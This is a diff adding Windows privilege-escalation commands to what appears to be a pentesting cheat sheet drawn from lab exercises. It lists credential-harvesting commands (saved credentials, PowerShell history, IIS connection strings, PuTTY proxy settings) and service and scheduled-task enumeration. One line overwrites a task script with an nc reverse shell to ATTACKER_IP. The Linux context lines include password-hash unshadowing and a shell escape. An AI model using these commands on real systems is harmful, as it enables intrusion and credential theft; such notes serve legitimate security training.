@@ -250,6 +250,21 @@ sudo mount -o rw 10.10.223.238:/home/ubuntu/sharedfolder /tmp/sharedfolder
 sudo unshadow passwd.txt shadow.txt > cracked.txt
 sudo find . -exec /bin/sh \; -quit.
 
+# Windows Privilege Escalation
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # Command History
+cmdkeys /list # List saved credentials
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString # Finding IIS DB connection strings
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s # Retrieving saved proxy creds
+schtasks /query /tn vulntask /fo list /v # Detailed info about a scheduled task
+icacls c:\tasks\schtask.bat # Checking file permissions on a executable
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat # Spawning a reverse shell on target by modifying the schtask
+sc qc <service-name> # Checking service configs. E.g. sc qc WindowsScheduler
+sc stop windowsscheduler # Stop a service
+sc start windowsscheduler # Start a service
+accesschk64.exe -qlc thmservice # Access Check permissions of a service
+wmic product get name,version,vendor
+
+
 
 # ======
 # Random
